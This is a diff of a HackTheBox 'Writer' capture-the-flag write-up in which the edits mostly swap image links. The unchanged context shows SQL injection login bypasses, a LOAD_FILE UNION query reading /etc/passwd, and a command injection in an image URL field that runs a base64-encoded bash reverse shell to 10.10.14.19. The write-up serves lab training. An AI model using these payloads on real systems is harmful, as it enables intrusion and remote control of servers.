@@ -441,9 +441,9 @@ Looks like annoymous login is no good as we can read any shares.
 ## WEB
 ### Visiting Website
 Visiting the website it looks like a normal blog website
-![[Pasted image 20210801113853.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801113853.png)
 At the Bottom you can see a refference to writer.htb so let's add it in /etc/hosts probably this is not required but it's better to be safe.
-![[Pasted image 20210801114253.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801114253.png)
 ### Directory Fuzzing
 ```bash
 kali@kali:~/HackTheBox/Writer$ ffuf -u http://10.10.11.101/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c
@@ -481,7 +481,7 @@ Looks like we have few intresting directories.
 let's first visit administrative.
 ### Crawling through the directories
 Looks like a normal login page.
-![[Pasted image 20210801114446.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801114446.png)
 /dashboard redirects to the homepage and /about has nothing intresting.
 /contact has the form looks like a dead form which requests with the get request but give 404 response.
 So the only good enpoint is the /administrative
@@ -1139,8 +1139,8 @@ ________________________________________________
 [2K    * PASS: '||true-- 2
 ```
 Looks like we have few payload working try any payload and you will be logged in as admin.
-![[Pasted image 20210801122338.png]]
-![[Pasted image 20210801122351.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801122338.png)
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801122351.png)
 so let's enumerate this more while running sqlmap in background.
 ### Sqlmap
 So I intercepted the post request using the burpsuite and save it to a local file.
@@ -1284,9 +1284,9 @@ back-end DBMS: MySQL >= 5.0.12 (TiDB fork)
 Looks like we have SQL Injection but we cannot retrive database names which is annoying so let's try and read some files.
 So we know that the it's time based blind sql injection so it will take up lot of time to get long file so I decided to check which payload sqlmap uses for the injection and play around with that payload manually to read some files.
 I used wireshark to get the exact payload that sqlmap used I used wireshark to capture traffic on my tun0 interface which looked like.
-![[Pasted image 20210805102726.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805102726.png)
 Then I picked up a POST request to /administrative endpoint that has a payload and followed it's TCP stream.
-![[Pasted image 20210805102841.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805102841.png)
 and we have the payload.
 ```bash
 UNAME%27%20AND%20%28SELECT%201088%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28IFNULL%28CAST%28HEX%28LOAD_FILE%280x2f6574632f686f73746e616d65%29%29%20AS%20NCHAR%29%2C0x20%29%29%2C6%2C1%29%29%3E57%2C0%2C1%29%29%29%29%29ZDPK%29%20AND%20%27GIYW%27%3D%27GIYW
@@ -1323,10 +1323,10 @@ UNION ALL SELECT
 ### step 3 -> Adjusting No. of rows.
 This is probably the trickiest step of all the steps.
 As we know that the table will have atleat two columns uname and password it's best to start with that. so let's try that.
-![[Pasted image 20210805104905.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805104905.png)
 So looks like our no. of columns is mismatched as we get incorrect credential when we get the no. of colums equal to the no. of colums in table we should be logged in.
 Trying for all number of columns we get hit on 6 columns.
-![[Pasted image 20210805105204.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805105204.png)
 so now we know the number of columns.
 ### step 4 -> Which column to inject so it returns the output.
 So the answer to this lies in the above photo upon succesfully injecting the query we get the output 'welcome 1' so we know the content of column 2 is displayed so we have to inject that column.
@@ -1340,11 +1340,11 @@ oops' UNION ALL SELECT 0,LOAD_FILE('/etc/passwd'),2,3,4,5; --
 ```
 So let's try that query.
 And Boom we have fast SQL query to read files.
-![[Pasted image 20210805105903.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805105903.png)
 So Now we can try few things we can try and search for passwords for most part we don't have much on this. [THERE IS THE UNINTENDED WAY BUT WE WILL KEEP DISTANCE FROM IT AS IT'S BASICALLY BRUTEFORCING]
 So another thing we could do is just look for the source code of the website and try to find vuln in that.
 So let's see the apache conf file to find the root directory of the installation of apache server.
-![[Pasted image 20210805111619.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805111619.png)
 Looks like the root directory is /var/www/writer.htb/writer/ and we have the path to .wsgi file so let's look at that first. /var/www/writer.htb/writer.wsgi
 ### writer.wsgi
 ```python
@@ -1364,7 +1364,7 @@ application.secret_key = os.environ.get(&#34;SECRET_KEY&#34;, &#34;&#34;)
 ```
 so we know that it has __init__.py in app folder so let's hunt for that.
 You find that file on /var/www/writer.htb/writer/__init__.py
-![[Pasted image 20210805112348.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805112348.png)
 ### __init__.py
 ```python
 #!/usr/bin/env python3
@@ -1702,20 +1702,20 @@ kali@kali:~/HackTheBox/Writer$
 ```
 Now that we have that file we have to upload it but before doing that start your nc listener.
 So now pick any of exsisting story and edit it and change the image file with your image file.
-![[Pasted image 20210805114506.png]]
-![[Pasted image 20210805114540.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805114506.png)
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805114540.png)
 After you did that then you have to trigger that mv {} {} command by going to edit and changing the image url.
 Now  intercept the the edit of the same story with the burp.
-![[Pasted image 20210805114825.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805114825.png)
 Now change the higlighted feild with the name of the malicious file.
 But you  have to give the local location of the filename so you know the base directory of the installation and from ffuf directorty fuzzing above we know that images are saved in /static.
-![[Pasted image 20210805115327.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805115327.png)
 and boom you can see our file so let's write a local path for this file.
 ```
 file:///var/www/writer.htb/writer/static/img/1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80NDMgMD4mMSc= | base64 -d | bash `;
 ```
 so let's change this as image url and add '#' sign at end so it ignores everything after our commands get executed.
-![[Pasted image 20210805120001.png]]
+![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805120001.png)
 And boom we have the REVSHELL.
 ```bash
 kali@kali:~/HackTheBox/Writer$ sudo rlwrap nc -nlvp 443
@@ -2234,4 +2234,8 @@ uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
 Now we are root let's get all the flags.
+
+
 # IF YOU LIKE THE WRITEUP GIVE Rep+
+Profie Link: [<img src="http://www.hackthebox.eu/badge/image/387509" alt="Hack The Box"/>](https://app.hackthebox.eu/profile/387509)
+
